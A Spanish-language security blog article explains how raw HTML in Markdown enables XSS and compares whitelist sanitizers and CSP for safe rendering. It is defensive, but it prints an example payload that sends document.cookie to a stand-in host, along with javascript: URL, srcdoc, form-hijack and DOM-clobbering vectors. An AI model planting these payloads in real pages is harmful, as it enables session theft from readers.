---
title: "XSS en Markdown: Markdown permite HTML crudo, y eso permite scripts"
description: Markdown deja pasar el HTML crudo, así que un .md puede llevar scripts: los vectores que hay que conocer, listas blancas frente a listas negras y qué añade una CSP
date: 2026-08-21
tag: Seguridad
keywords: xss en markdown, sanitizar markdown, sanitizar html, dompurify, markdown con html permitido, html crudo en markdown, renderizado seguro de markdown, contenido generado por usuarios, content security policy html
---

Markdown se diseñó para convivir con HTML, no para sustituirlo. Las reglas de sintaxis originales dejan pasar el HTML sin tocarlo, y los parsers que las siguen hacen lo mismo hoy. Si le pasas una etiqueta `<script>` a `marked` o a Python-Markdown, recibes de vuelta una etiqueta `<script>`; `markdown-it` y remark hacen lo mismo en cuanto se activa el HTML crudo.

### Resumen rápido

Markdown permite HTML crudo por diseño, así que cualquier Markdown que no hayas escrito tú puede llevar `<script>`, `onerror=`, URLs `javascript:`, `<iframe srcdoc>`, acciones de formulario e ids que se solapan con tus propias variables globales. La solución es un **sanitizador con lista blanca aplicado al HTML ya renderizado**, nunca a la fuente Markdown, porque el renderizador inventa marcado que nunca apareció literalmente en el archivo. Usa DOMPurify en el navegador y, en el servidor, un sanitizador de Node, Python, Go, Java, Rust o Ruby contra la *misma* lista blanca, y añade después una Content Security Policy a la página para que un fallo del sanitizador se convierta en una petición bloqueada y no en una sesión robada.

Nadie decide un día renderizar Markdown de origen dudoso. Llega de rebote. Una caja de comentarios crece un panel de vista previa, una mesa de soporte empieza a aceptar tickets con formato, un script de compilación renderiza cada README de un monorepo en un panel interno, la respuesta de un modelo va directa a una página para que alguien pueda leerla bien. En cada caso, una cadena que controla otra persona termina en un documento con el que tu propio JavaScript comparte ventana.

Eso es un comportamiento correcto para un archivo que sale de tu propio repositorio. Para un comentario, un ticket o la salida de un modelo de lenguaje, es un agujero: algo tiene que colocarse entre el parser y la página.

La palabra «sanitizar» esconde cuánta decisión hay detrás. Un sanitizador no es un interruptor que se activa. Es una declaración escrita de qué etiquetas y atributos permite tu producto, aplicada en un único punto de la cadena, en un entorno cuyo parser de HTML coincide con el que va a usar el lector. Si la declaración está mal, es decoración; si el punto está mal, es peor que decoración, porque todo lo que viene después parece seguro.

## El HTML crudo en Markdown es una función, no un descuido

La premisa de Markdown era que su sintaxis nunca lo cubriría todo, así que lo que no cubriera se escribiría en HTML. Esa premisa es la razón por la que el formato se difundió y por la que sigue siendo el camino más corto de un texto a una página. También es la razón por la que todo renderizador conforme es, por contrato, un pasillo abierto al HTML.

Un payload no necesita parecer uno. Esto es Markdown válido:

```markdown
Gracias por el arreglo, ya funciona.

<img src=x onerror="fetch('https://elsewhere.invalid/?c='+document.cookie)">
```

El parser reconoce un fragmento de HTML y lo copia a la salida. Nada está mal formado, así que nada avisa. No hay error, ni línea de log, ni rastro visible en la página renderizada — una imagen rota es lo único que todo lector ha aprendido a ignorar.

Los parsers solían intentar ayudar. `marked` tenía una opción `sanitize`; se marcó como obsoleta y luego se eliminó, y la documentación pasó a señalar hacia un sanitizador dedicado. Fue la decisión correcta. Un filtro de HTML a medio escribir dentro de un parser de Markdown es peor que ninguno, porque se lee como protección: quien revisa el código ve `sanitize: true` en un objeto de opciones y deja de hacer preguntas. Sanitizar HTML de forma correcta implica mantener un parser, un serializador, una lista blanca y un proceso de respuesta ante incidentes de seguridad, y una biblioteca de Markdown no tiene por qué prometer tres de esas cuatro cosas.

La solución más simple, cuando encaja: `markdown-it` deja el HTML crudo desactivado por defecto, así que los signos de mayor y menor que salen escapados y visibles. Si tus usuarios no tienen ningún motivo para escribir HTML, déjalo apagado — menos código y menos fallos que cualquier lista blanca. [Python-Markdown](/blog/markdown-to-html-in-python) no tiene un interruptor equivalente y su documentación te remite a un sanitizador aparte, así que un pipeline en Python siempre tiene un segundo paso, lo haya escrito alguien o no.

Apagar el HTML crudo es la única opción de esta página que elimina la superficie de ataque en vez de filtrarla. Todo lo demás es un juicio sobre qué HTML estás dispuesto a ejecutar.

## Los vectores, uno a uno

La lista de abajo no recoge trucos exóticos. Es la superficie ordinaria de HTML — un lenguaje para construir aplicaciones — puesta en manos de un documento escrito por un desconocido.

| Lo que llega | Lo que hace | La regla |
| --- | --- | --- |
| `<script>alert(1)</script>` | Se ejecuta si el HTML se parsea en vez de asignarse por un canal seguro | No permitir nunca `script`; tampoco `noscript` |
| `<img src=x onerror=...>` | Se dispara cuando la imagen falla, y va a fallar | Descartar todo atributo cuyo nombre empiece por `on` |
| `<a href="javascript:...">` | Se ejecuta al hacer clic, sin necesidad de etiqueta script | Permitir solo `http`, `https`, `mailto` y rutas relativas |
| `<a href="data:text/html,...">` | Todo un documento dentro de una URL | Mantener `data:` fuera de `href` por completo |
| `<iframe srcdoc="...">` | Lleva un documento dentro de un atributo, en tu origen | Descartar `iframe`, `object`, `embed` |
| `<form action="https://elsewhere">` | Convierte tus campos en el formulario de otro | Descartar `form`, `button`, `input`, `formaction` |
| `<style>` y `style="..."` | Reposiciona, superpone, oculta y filtra información por `url()` | Descartar ambos salvo que tengas un motivo |
| `<a id="config">` | Se solapa con `window.config` sin ejecutar código | Prefijar todo `id` y `name` que sobreviva |
| `<base href="//elsewhere">` | Redirige cada URL relativa de la página | Descartarlo; fijar `base-uri 'none'` |
| `<meta http-equiv="refresh">` | Hace que el lector se vaya de la página | Descartar `meta` |
| `<svg>`, `<math>`, `<template>` | Reglas de parsing distintas, así que fallos distintos | Descartar salvo que la lista blanca los necesite |

**Los atributos de evento son el plato principal.** `<script>` es el vector que todos bloquean primero y el que menos importa, porque los payloads interesantes no lo necesitan. Cada atributo `on*` es un script inline con otra ortografía, y la especificación sigue añadiendo más a la lista. Ese es el argumento más claro para poner los atributos en lista blanca en vez de nombrar los que no te gustan: no puedes enumerar `on*` correctamente, y no tienes por qué hacerlo.

**Los esquemas hay que decodificarlos antes de comprobarlos.** Prueba el valor ya decodificado, no la cadena en crudo. `java&#9;script:`, `JaVaScRiPt:` y una URL con un salto de línea al principio son una sola URL para un navegador y varias cadenas distintas para una comparación ingenua. Mantén `data:` fuera de `href` como norma: los navegadores sí bloquean una navegación de nivel superior a `data:text/html`, pero es su mitigación, no la tuya, y no cubre todos los destinos posibles.

**`srcdoc` es el atributo que se olvida.** Un `<iframe srcdoc>` lleva un documento HTML completo dentro del valor de un atributo, escapado dos veces, y hereda el origen del documento que lo incrusta. Un sanitizador que permite `iframe` para vídeos y se olvida de `srcdoc` ha dejado pasar HTML arbitrario del mismo origen por un hueco con forma de reproductor de vídeo.

**Las acciones de formulario no necesitan script para robar.** Un `<form action="https://elsewhere.invalid">` inyectado alrededor de parte de tu página convierte el siguiente clic del lector en un envío a otro sitio, y un `<input type="image" formaction="...">` sustituye la acción de un formulario que tú escribiste. No se ejecuta nada; el navegador hace exactamente lo que dice el marcado. Por eso `form` e `input` merecen cuidado incluso cuando permites `<input type="checkbox" disabled>` para las listas de tareas de GFM — permite solo la combinación de atributos que necesitas y nada más.

**El CSS es una capacidad, no una decoración.** La sintaxis `expression()` que en su día hacía que `style` fuera directamente ejecutable desapareció hace mucho de los navegadores actuales, y por eso el CSS sigue teniendo esa fama. Los problemas reales de hoy son más discretos. `position: fixed` con un `z-index` alto coloca el elemento de un atacante encima de tu interfaz, así que un clic en «Cancelar» va a parar a otra cosa. `opacity: 0` esconde texto que sigue siendo seleccionable. Un `url()` en un fondo llega a un tercero en el momento en que el elemento se renderiza, lo que funciona como un aviso de cuándo se ha leído tu documento. Nada de eso ejecuta un script y todo eso es un problema, por lo que la respuesta por defecto para `<style>` y `style` es no.

## DOM clobbering: un id que se solapa con una propiedad

Cada elemento con un `id` se convierte en una propiedad de `window` bajo ese nombre, y los controles de formulario con nombre se convierten en propiedades de su formulario. Un `<a id="config">` inyectado hace que `window.config` sea un elemento de anclaje, así que `if (!window.config) { window.config = defaults }` toma la rama equivocada, y `config.apiBase` pasa a ser `undefined` en vez de tu URL — o, con `<a id="config" name="apiBase" href="//elsewhere">`, lo que un atacante haya elegido. No se ejecutó ningún script. Un atributo fue suficiente.

Los sanitizadores cubren menos de esto de lo que su fama sugiere. La comprobación de DOM clobbering por defecto de DOMPurify solo descarta un `id` o `name` cuando el valor ya es una propiedad de `Document` o de `HTMLFormElement`: `id="title"`, `id="body"`, `id="cookie"` e `id="action"` se van, `id="config"` se queda. `config` es un nombre que inventó tu propio código, y ningún sanitizador mira tus variables globales. La cobertura más completa es `SANITIZE_NAMED_PROPS`, desactivada por defecto, que prefija con `user-content-` cada `id` y `name` que sobrevive.

Ese prefijo es la defensa real — un id que no puede colisionar no puede solapar nada — y tiene que cubrir tanto los ids que llegan en el documento como los que tu propio renderizador genera a partir de los encabezados, porque un encabezado llamado «Config» produce `id="config"` sin que ningún atacante intervenga. Este sitio sanitiza con DOMPurify en el navegador y con el paquete `xss` en el servidor, contra una única lista blanca compartida, y prefija cada id de encabezado con `doc-`: la misma defensa aplicada a mano. Si generas anclas para un índice, este es el paso que hay que añadir hoy, antes que cualquier otro de esta página.

## Las listas blancas ganan a las listas negras

Una lista negra nombra lo que está prohibido y falla la primera vez que alguien usa una etiqueta que nadie había pensado. Falla otra vez cada vez que un navegador lanza una función nueva, y una tercera con la capitalización, la codificación o un atributo que quien escribió la lista nunca conoció. Una lista blanca nombra lo que puede contener un documento y descarta el resto, así que su modo de fallo es un `<details>` que falta, no una sesión robada.

La lista blanca se mantiene corta porque la salida de Markdown es pequeña: encabezados, párrafos, listas, citas, tablas, código, énfasis, enlaces, imágenes, líneas horizontales y un `<input>` para las listas de tareas. La lista de atributos es todavía más corta — `href`, `src`, `alt`, `title`, `class` si estilizas bloques de código, `colspan` y `rowspan` si tus tablas los necesitan, `type`, `checked` y `disabled` para las listas de tareas.

Escribe esa lista en un único archivo e impórtala en todas partes. El fallo real más habitual no es una brecha, es un desajuste: el sanitizador del navegador y el del servidor se configuraron por separado, con seis meses de diferencia, por dos personas distintas, y el documento que se renderiza sin problemas en la aplicación se guarda con el `<iframe>` intacto para que lo encuentre el siguiente consumidor. Dos listas blancas son una lista blanca y un riesgo.

La otra regla es que la lista blanca pertenece al producto, no a la biblioteca. El `defaultSchema` de `rehype-sanitize` sigue las reglas de sanitización de GitHub, y `UGCPolicy()` de bluemonday es un valor por defecto bien pensado para contenido de usuarios — ambos son mejores puntos de partida que cualquier cosa que escribas en una tarde. Ninguno de los dos sabe si tu página tiene un `<div id="app">` que lee tu framework. Empieza desde la política que te ofrecen y luego resta.

## Sanitiza después de renderizar, nunca antes

Sanitizar la fuente Markdown significa adivinar qué va a hacer el parser con ella, y el parser te va a sorprender. Markdown tiene varias formas de escribir la misma salida — enlaces por referencia, escapes con barra invertida, entidades de carácter, bloques de HTML con sangría — así que un filtro que busca `javascript:` en la fuente se salta `[click](java&#115;cript:alert(1))` y una definición de referencia trescientas líneas por debajo del enlace que la usa. Peor aún, el renderizador inventa marcado que nunca apareció literalmente: un autolink se convierte en un `<a href>` completo que la fuente nunca contenía, un bloque de código con vallas se convierte en `<pre><code class="language-...">`, un encabezado se convierte en un `id`. Un filtro sobre la fuente filtra la cadena equivocada.

Así que sanitiza lo que emitió el renderizador, y a partir de ahí no lo vuelvas a tocar:

```js
import DOMPurify from 'dompurify';
import { marked } from 'marked';

const clean = DOMPurify.sanitize(marked.parse(userMarkdown), {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code', 'pre', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
  SANITIZE_NAMED_PROPS: true,
});
```

«A partir de ahí no lo vuelvas a tocar» es la mitad que la gente se salta. Un resaltador de sintaxis que envuelve tokens en spans, una plantilla que interpola la cadena en un contenedor, una expresión regular que reescribe anclas para añadir `target="_blank"`, un paso que inyecta anclas de encabezado para un índice: cada uno se ejecuta después del sanitizador y queda fuera de su garantía. Si una transformación tiene que ocurrir, o bien se ejecuta antes del sanitizador para que su salida también se compruebe, o se realiza sobre el DOM después de insertarlo, usando `textContent` y `setAttribute` en vez de editar una cadena.

Una regla más sobre el orden: guarda el Markdown *original*, no el HTML sanitizado. Sanitizar a la entrada y confiar después en lo guardado congela tu lista blanca en la fecha de esa escritura, así que el día que la endurezcas, todos los documentos antiguos se quedan como estaban.

## Mutation XSS: dos parsers en desacuerdo

Un sanitizador convierte el HTML en un árbol, decide que el árbol está limpio y lo vuelve a serializar como cadena. El navegador luego vuelve a parsear esa cadena. Si el segundo análisis produce un árbol distinto del primero, la comprobación se hizo sobre un documento que nadie llega a servir. Eso es mutation XSS, y el fallo no pertenece a ninguno de los dos parsers — solo al desacuerdo entre ellos.

Los sitios que hay que vigilar son aquellos donde las reglas de parsing de HTML cambian a mitad del documento. El contenido ajeno como `<svg>` y `<math>` sigue reglas casi de XML en las que `<style>` y los comentarios se comportan de otra manera. `<template>` tiene su propio documento de contenido. El anidamiento que fuerza el cierre implícito de una etiqueta puede sacar un elemento del subárbol en el que se comprobó. Las entidades dentro de valores de atributo se decodifican en una etapa distinta de las entidades en texto.

Las defensas son aburridas, y ser aburridas es lo que importa. Mantén el sanitizador actualizado, porque este tipo de fallo lo encuentran investigadores y se corrige en versiones, así que una versión fijada desde hace tres años es el riesgo real. No encadenes nunca dos sanitizadores, porque lo que emite el último es lo que se sirve y la garantía del primero queda anulada. Mantén el contenido ajeno fuera de la lista blanca salvo que un requisito lo pida ahí.

Sanitizar en el servidor tiene aquí un hueco estructural: sin navegador trae su propio parser, no el que va a usar tu lector. La respuesta de Ammonia es html5ever, que parsea y serializa fragmentos igual que lo hacen los navegadores; la de sanitize-html es htmlparser2, elegido por velocidad y tolerancia. Tolerancia y fidelidad no son la misma propiedad. Simular un DOM es peor que cualquiera de las dos opciones — dado un entorno que no puede usar, DOMPurify devuelve su entrada sin cambios en vez de lanzar un error, así que una configuración de jsdom rota falla en modo abierto, y en silencio.

## Comparativa rápida: la chuleta

| Herramienta | Mejor para | Capacidad clave | Precio |
| --- | --- | --- | --- |
| Sin HTML crudo en absoluto | Comentarios, chat, cualquier cosa que nunca necesitó HTML | `markdown-it` escapa el HTML crudo por defecto | Gratis, MIT |
| DOMPurify (navegador) | Renderizar Markdown de origen dudoso en una página | Usa el propio parser del navegador, así que no hay una segunda opinión | Gratis, Apache 2.0 o MPL 2.0 |
| DOMPurify + jsdom | Reutilizar una lista blanca en un servidor Node | El mismo objeto de configuración, un DOM sintético | Gratis, Apache 2.0 o MPL 2.0; jsdom MIT |
| sanitize-html | Node sin un DOM | htmlparser2, listas blancas de atributos por elemento | Gratis, MIT |
| js-xss (`xss`) | Node, navegadores y una línea de comandos | Opción `whiteList`, sin necesidad de DOM, con CLI propia | Gratis, MIT |
| rehype-sanitize | Pipelines de remark y unified | Sanitiza el árbol hast, no una cadena | Gratis, MIT |
| nh3 | Python | Bindings hacia ammonia, en Rust | Gratis, MIT |
| Bleach | Nada nuevo | Fue el estándar de Python; ahora sin mantenimiento | Gratis, Apache 2.0 |
| bluemonday | Go | Presets `UGCPolicy()` y `StrictPolicy()` | Gratis, BSD-3-Clause |
| OWASP Java HTML Sanitizer | Java | `HtmlPolicyBuilder`, sin dependencias en tiempo de ejecución | Gratis, Apache 2.0 o BSD-2-Clause |
| Ammonia | Rust | html5ever, parsea como un navegador | Gratis, MIT o Apache 2.0 |
| Loofah | Ruby | Scrubbers de Nokogiri; el sanitizador de Rails se apoya en él | Gratis, MIT |
| Content Security Policy | El fallo del sanitizador que aún no has encontrado | Bloquea la ejecución sin importar el marcado | Gratis, un estándar web |
| Iframe en sandbox | Documentos que no puedes hacer seguros | `sandbox` quita origen, scripts y formularios | Gratis, parte de HTML |
| TransformPipe | Convertir un `.md` que no escribiste tú | Sanitiza en el navegador y en el servidor, con una única lista blanca | Gratis |

## Las opciones, una a una

### Sin HTML crudo en absoluto — la opción que nadie considera primero

Antes de elegir un sanitizador, pregúntate si la función existe siquiera. Si tus usuarios escriben comentarios, mensajes de chat o cuerpos de ticket, casi ninguno quiere escribir HTML, y los que sí quieren son la razón por la que estás leyendo esto. `markdown-it` viene con `html: false`, que escapa los signos de mayor y menor que para que se rendericen como texto visible.

| A favor | En contra |
| --- | --- |
| Elimina la superficie de ataque en vez de filtrarla | Cualquier cosa que Markdown no pueda expresar deja de ser posible |
| Ninguna lista blanca que mantener, ningún sanitizador que actualizar | Los documentos escritos en otro sitio ya pueden llevar HTML dentro |
| Sin mutation XSS, porque nada se vuelve a parsear | Los usuarios que necesiten un bloque `<details>` se van a quejar |

**Precio:** gratis, con licencia MIT.

**Detalles técnicos y funciones**

- `markdown-it` viene con `html: false` por defecto; el HTML crudo de la fuente se escapa, no se parsea
- `marked` y Python-Markdown dejan pasar el HTML crudo y esperan un sanitizador aparte
- Escapar no es sanitizar: produce texto, y por eso no se puede saltar

**¿Para quién es?** Para cualquiera que renderice texto corto generado por usuarios. Es la opción por defecto correcta para una caja de comentarios, y se elige mucho menos de lo que debería.

### DOMPurify en el navegador — la respuesta por defecto

DOMPurify sanitiza una cadena de HTML usando el DOM del entorno en el que se ejecuta. En un navegador es el mismo parser que va a renderizar el resultado, lo que elimina de raíz el hueco de mutation XSS: no hay una segunda opinión, porque solo hay un parser.

| A favor | En contra |
| --- | --- |
| Usa el propio parser del navegador, así que el árbol comprobado es el árbol renderizado | Necesita un DOM, así que en Node puro hace falta jsdom |
| Mantenido activamente, con un historial real de respuesta a incidentes | `SANITIZE_NAMED_PROPS` está apagado por defecto, así que el clobbering solo se cubre a medias |
| La configuración es un único objeto de opciones que puedes compartir en todo el código | Devuelve la entrada sin cambios si el DOM no funciona, lo que falla en modo abierto |
| Los hooks permiten inspeccionar y rechazar nodos durante el sanitizado | Los valores por defecto de la lista blanca son amplios; la mayoría de productos deberían restar sobre ellos |

**Precio:** gratis, con doble licencia Apache 2.0 o MPL 2.0.

**Detalles técnicos y funciones**

- `ALLOWED_TAGS` y `ALLOWED_ATTR` para una lista blanca desde cero; `ADD_TAGS` y `ADD_ATTR` para ampliar los valores por defecto
- `USE_PROFILES` restringe a los conjuntos de HTML, SVG o MathML en vez de a los tres a la vez
- `FORBID_TAGS` y `FORBID_ATTR` para restar sobre los valores por defecto
- `SANITIZE_NAMED_PROPS` prefija los valores de `id` y `name` que sobreviven, que es el arreglo del DOM clobbering
- `ALLOW_DATA_ATTR` y `ALLOW_ARIA_ATTR` controlan las dos familias de atributos en bloque

**¿Para quién es?** Para cualquiera que renderice Markdown en una página dentro de un navegador. [La guía en JavaScript](/blog/markdown-to-html-in-javascript) explica cómo conectar `marked` y DOMPurify en el orden correcto.

### DOMPurify con jsdom — la misma lista blanca en un servidor

DOMPurify también funciona en Node contra una ventana de jsdom. El motivo para hacer esto no es que sea el mejor sanitizador de servidor — es que es el *mismo* sanitizador, configurado por el mismo objeto, así que el navegador y el servidor no pueden desajustarse entre sí.

| A favor | En contra |
| --- | --- |
| Una sola lista blanca, una sola configuración, dos entornos de ejecución | jsdom es una dependencia grande para una sola tarea |
| El comportamiento se ajusta de cerca al del navegador | jsdom no es un navegador, así que el hueco del parser vuelve a aparecer |
| API conocida si tu frontend ya lo usa | Una ventana mal configurada lo convierte en un no-op sin ningún error |

**Precio:** gratis; DOMPurify con Apache 2.0 o MPL 2.0, jsdom con MIT.

**Detalles técnicos y funciones**

- Instánciarlo con `createDOMPurify(new JSDOM('').window)` y reutilizar la instancia
- Importar la lista blanca desde un módulo compartido para que no se pueda editar en un solo lado
- Comprobar en las pruebas que una etiqueta `<script>` se elimina en la configuración desplegada

**¿Para quién es?** Para servicios en Node que ya renderizan Markdown en el cliente y quieren una única definición de «seguro» en vez de dos.

### sanitize-html — un sanitizador de Node con su propio parser

sanitize-html limpia HTML con listas blancas de atributos por cada elemento, construido sobre htmlparser2 en vez de sobre un DOM. La forma de sus opciones se ajusta bien a como se lee de verdad una lista blanca de Markdown: esta etiqueta puede tener estos atributos, y ningún otro.

| A favor | En contra |
| --- | --- |
| Sin DOM y sin jsdom, así que es ligero en un proceso de servidor | Su parser no es el del navegador, que es el hueco de mXSS |
| Las listas blancas de atributos son por elemento, la granularidad correcta | La configuración es extensa para una lista blanca amplia |
| `transformTags` reescribe elementos durante el paso | El repositorio independiente está archivado y en solo lectura, con el desarrollo trasladado al monorepo de ApostropheCMS (comprobado en github.com/apostrophecms/sanitize-html, el 8 de septiembre de 2026) |

**Precio:** gratis, con licencia MIT.

**Detalles técnicos y funciones**

- `allowedTags`, `allowedAttributes`, `allowedSchemes` y `transformTags` como opciones principales
- Construido sobre htmlparser2, descrito por el proyecto como elegido por velocidad y tolerancia
- Funciona en cualquier sitio donde corra Node, sin ningún paso de compilación nativa

**¿Para quién es?** Para servicios en Node que quieren una lista blanca real sin cargar con una implementación de DOM, y para equipos a los que les resulte más fácil revisar su forma de opciones por elemento que una lista plana.

### js-xss — un sanitizador sin DOM y con línea de comandos

El paquete `xss` sanitiza HTML en Node y en navegadores contra una opción `whiteList`, sin necesitar un DOM. También trae una CLI, lo que lo hace útil dentro de un pipeline de shell además de en un servicio.

| A favor | En contra |
| --- | --- |
| Funciona en Node y en navegadores sin depender de un DOM | Tiene su propio parser, así que se aplica el hueco del parser |
| Una CLI, así que encaja en un script de build sin escribir código | Superficie de configuración más pequeña que la de DOMPurify |
| `whiteList` mapea directamente sobre pares de etiqueta y atributo | `allowList` es un alias, así que la documentación se lee de dos formas |

**Precio:** gratis, con licencia MIT.

**Detalles técnicos y funciones**

- `whiteList` (con el alias `allowList`) define las etiquetas permitidas y sus atributos
- Manejadores personalizados para valores de atributo, útiles para comprobar esquemas en `href`
- `xss -i <entrada> -o <salida>` sanitiza un archivo desde la línea de comandos

**¿Para quién es?** Para servicios en Node que quieren una dependencia pequeña, y para cualquiera que sanitice un archivo en CI sin navegador. Esta es la mitad de servidor del pipeline de este sitio, emparejada con DOMPurify en el navegador contra una única lista blanca compartida.

### rehype-sanitize — sanitizar el árbol, no la cadena

Si tu pipeline es remark o unified, rehype-sanitize sanitiza el árbol hast en mitad de la cadena. Nada se serializa, se comprueba y se vuelve a parsear, lo que elimina toda una clase de fallo eliminando el paso en el que vive.

| A favor | En contra |
| --- | --- |
| Opera sobre el árbol, así que no hay ida y vuelta como cadena que pueda desajustarse | Solo tiene sentido dentro de un pipeline de unified |
| `defaultSchema` sigue las reglas de sanitización de GitHub, un punto de partida bien pensado | El pipeline de unified trae su propia curva de aprendizaje real |
| No necesita DOM; funciona en Node, Deno y navegadores | Solo ESM, y la sintaxis del schema es algo aparte que aprender |

**Precio:** gratis, con licencia MIT.

**Detalles técnicos y funciones**

- Sanitiza hast, el árbol de sintaxis de HTML, entre `remark-rehype` y `rehype-stringify`
- `defaultSchema` se exporta y se puede ampliar o reducir
- Colócalo después de cualquier plugin que genere HTML, y antes del stringify

**¿Para quién es?** Para equipos que ya usan remark o unified para transformar documentos y no solo para renderizarlos. Un sanitizador dentro del pipeline le gana a uno atornillado a la salida.

### nh3 — la respuesta de Python

nh3 ofrece bindings de Python hacia ammonia, el sanitizador de HTML en Rust. Como el trabajo ocurre en una biblioteca compilada que usa un parser de calidad de navegador, es a la vez rápido y más fiel al comportamiento de un navegador que un filtro puro en Python.

| A favor | En contra |
| --- | --- |
| Respaldado por ammonia y html5ever, que parsean como los navegadores | Es una dependencia compilada, así que los wheels importan en entornos limitados |
| Mantenido, y el reemplazo práctico de Bleach | Superficie de API más pequeña que la de Bleach |
| Basado en lista blanca, en línea con lo que defiende este artículo | Su configuración no es un reemplazo directo de la de Bleach |

**Precio:** gratis, con licencia MIT.

**¿Para quién es?** Para servicios en Python que sanitizan salida de Markdown, y para cualquiera que todavía importe Bleach.

### Bleach — el que hay que migrar

Bleach fue el sanitizador de HTML por defecto en Python durante años y buena parte del tooling existente aún lo importa. Ya no tiene mantenimiento: el README indica que no habrá futuras versiones, ni siquiera por problemas de seguridad (comprobado en github.com/mozilla/bleach, el 8 de septiembre de 2026).

| A favor | En contra |
| --- | --- |
| Una base amplia de código y documentación ya existente | Sin mantenimiento, sin versiones de seguridad futuras |
| API de lista blanca conocida | Un sanitizador sin mantenimiento es la única dependencia que no puedes fijar y olvidar |
| Sigue funcionando para los casos que ya cubría | La defensa contra mXSS depende de un mantenimiento continuo, que se ha detenido |

**Precio:** gratis, con licencia Apache 2.0.

**¿Para quién es?** Para nadie, en trabajo nuevo. Si está en tu archivo de requisitos, eso es un ticket de migración y no una nota al pie — es una clase de fallo donde «mantenerlo actualizado» es casi toda la defensa.

### bluemonday — la respuesta de Go

bluemonday sanitiza HTML en Go contra una política que construyes tú o uno de sus presets. Sus dos políticas con nombre encajan de forma limpia con las dos situaciones que tiene la mayoría de los productos.

| A favor | En contra |
| --- | --- |
| `UGCPolicy()` es un punto de partida sensato para contenido de usuarios | Solo para Go |
| `StrictPolicy()` elimina todo el marcado, para títulos y campos de una sola línea | Construir la política es código, así que necesita revisión como código |
| Basado en lista blanca por diseño, con patrones de expresión regular para valores de atributo | Tiene su propio parser, así que se aplica el hueco del parser |

**Precio:** gratis, con licencia BSD-3-Clause.

**Detalles técnicos y funciones**

- `UGCPolicy()` permite un conjunto amplio de elementos para contenido de usuarios y excluye iframes, objects, embeds, styles y scripts
- `StrictPolicy()` elimina todos los elementos y atributos
- Las políticas se pueden componer, así que puedes partir de un preset y restar

**¿Para quién es?** Para servicios en Go que renderizan Markdown de usuarios. Empieza con `UGCPolicy()` y elimina lo que tu producto no necesite.

### OWASP Java HTML Sanitizer — la respuesta de Java

Un sanitizador en Java con un constructor de políticas explícito y sin dependencias en tiempo de ejecución, mantenido bajo el paraguas de OWASP. La API `HtmlPolicyBuilder` hace que la lista blanca se lea como una especificación, lo que resulta útil cuando la lista blanca tiene que sobrevivir a una revisión de seguridad.

| A favor | En contra |
| --- | --- |
| `HtmlPolicyBuilder` produce una política legible y revisable | Solo para Java |
| Sin dependencias en tiempo de ejecución | Las políticas ya preparadas son estrechas, así que la mayor parte del trabajo es tuyo |
| `Sanitizers.FORMATTING` y `Sanitizers.LINKS` preempaquetados, combinables | Tiene su propio parser, así que se aplica el hueco del parser |

**Precio:** gratis, con doble licencia Apache 2.0 o BSD-2-Clause.

**¿Para quién es?** Para servicios en la JVM. La API de constructor es la expresión más clara de listas blancas de cualquier lenguaje de esta lista, lo que la convierte en algo bueno para mostrar a alguien a quien todavía no has convencido.

### Ammonia — la respuesta de Rust, y el argumento sobre el parser

Ammonia es un sanitizador de HTML con lista blanca escrito en Rust y construido sobre html5ever. Su planteamiento declarado es parsear y serializar fragmentos de documento igual que lo hacen los navegadores, que es la propiedad que más importa en un sanitizador de servidor.

| A favor | En contra |
| --- | --- |
| html5ever parsea como los navegadores, estrechando el hueco del parser | Solo Rust, salvo que lo uses a través de bindings |
| Basado en lista blanca y rápido | Menos políticas ya preparadas que las de bluemonday |
| También es el motor detrás de nh3 para Python | Una dependencia compilada en builds políglotas |

**Precio:** gratis, con doble licencia MIT o Apache 2.0.

**¿Para quién es?** Para servicios en Rust y, a través de nh3, en Python. También vale la pena leerlo si estás eligiendo un sanitizador de servidor en cualquier lenguaje, porque su decisión sobre el parser es el argumento que deberías aplicar a los demás.

### Loofah — la respuesta de Ruby

Loofah limpia HTML usando Nokogiri, con scrubbers que eliminan, recortan, escapan o depuran el marcado. El propio sanitizador de HTML de Rails se construye encima, así que la mayoría de aplicaciones Ruby ya lo están usando de forma indirecta.

| A favor | En contra |
| --- | --- |
| Construido sobre Nokogiri, un parser de HTML bien probado | Solo para Ruby |
| Ya está debajo del sanitizador de Rails, así que está bien probado en producción | Nokogiri es una dependencia nativa |
| Varias estrategias de limpieza, no solo una | Los nombres de las estrategias cuestan un poco de aprender |

**Precio:** gratis, con licencia MIT.

**¿Para quién es?** Para aplicaciones Ruby y Rails. Si ya llamas al helper `sanitize` de Rails, ya estás aquí; la pregunta es si la lista blanca es tuya o la que trae el framework por defecto.

### Content Security Policy — la capa que un sanitizador no puede ser

Una CSP no es un sanitizador y no compite con uno. Responde a una pregunta distinta: qué pasa cuando el sanitizador se equivoca. Un sanitizador intenta garantizar que ningún marcado ejecutable llegue a la página; una CSP le dice al navegador que no ejecute marcado sin importar cómo haya llegado.

| A favor | En contra |
| --- | --- |
| Funciona sobre el fallo que todavía no has encontrado | No sustituye a sanitizar; no elimina nada |
| `script-src 'none'` es absoluto en una página sin scripts propios | Una página que ejecuta su propio JavaScript no puede usar `'none'` |
| `base-uri 'none'` y `frame-ancestors 'none'` cierran vectores que ninguna lista blanca cubre | Adaptar una política a una aplicación existente es trabajo real |
| Los endpoints de reporte convierten los intentos de inyección en telemetría | `frame-ancestors` y `sandbox` se ignoran dentro de una etiqueta `<meta>` |

**Precio:** gratis, un estándar web implementado por los navegadores.

**Detalles técnicos y funciones**

- `script-src 'none'` en una página cuya única función es mostrar documentos
- `base-uri 'none'` neutraliza un `<base href>` inyectado, algo que ninguna lista blanca de etiquetas puede expresar
- `frame-ancestors 'none'` evita que tu documento se muestre dentro de la página de otro
- `img-src` y `connect-src` limitan a dónde puede enviar una petición un elemento que haya sobrevivido
- Se entrega como cabecera de respuesta o como etiqueta `<meta http-equiv>`, y la forma meta ignora `frame-ancestors`, `report-uri` y `sandbox`

**¿Para quién es?** Para toda página que renderiza el documento de otra persona. El intercambio es real: una página que ejecuta su propio JavaScript no puede usar `script-src 'none'`, lo que es un argumento a favor de mover el renderizado de documentos ajenos a su propia ruta. Un documento [compartido como enlace](/blog/share-a-markdown-document-as-a-link) desde TransformPipe se sirve así, y el archivo que descargas no tiene ningún script.

### Un iframe en sandbox — aislamiento cuando filtrar no basta

A veces el documento tiene que conservar marcado que no puedes permitir de forma segura — un informe interno con sus propios estilos, un correo renderizado, la salida de un sistema que no controlas. Renderízalo dentro de un iframe con un atributo `sandbox` y correrá en un origen opaco sin acceso a tu página.

| A favor | En contra |
| --- | --- |
